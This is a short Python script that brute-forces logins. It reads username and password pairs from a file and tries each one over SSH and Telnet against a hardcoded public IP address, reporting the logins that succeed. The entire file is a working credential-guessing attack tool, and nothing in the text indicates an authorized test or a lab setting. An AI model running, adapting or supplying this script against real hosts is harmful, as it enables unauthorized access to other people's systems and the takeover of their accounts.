import paramiko
import telnetlib

def SSHLogin(host, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port, username, password)
        sshSession = ssh.get_transport().open_session()
        if sshSession.active:
            print("[+] Successful login with " + username + " and " + password)
            sshSession.close()
    except:
        print("[-] Failed login with " + username + " and " + password)


def TelnetLogin(host, port, username, password):
    try:
        tn = telnetlib.Telnet(host, port)
        tn.read_until(b"Username: ")
        tn.write((username + "\n").encode('utf-8'))
        tn.read_until(b"Password: ")
        tn.write((password + "\n").encode('utf-8'))
        result = tn.expect([b"Last Login"], timeout=2)
        if result[0] >= 0:
            print("[+] Successful login with " + username + " and " + password)
            tn.close()
    except:
        print("[-] Failed login with " + username + " and " + password)

host = "3.20.135.129"

with open("passwords.txt", "r") as f:
    for line in f:
        vals = line.split()
        username = vals[0].strip()
        password = vals[1].strip()
        SSHLogin(host, 22, username, password)
        TelnetLogin(host, 23, username, password)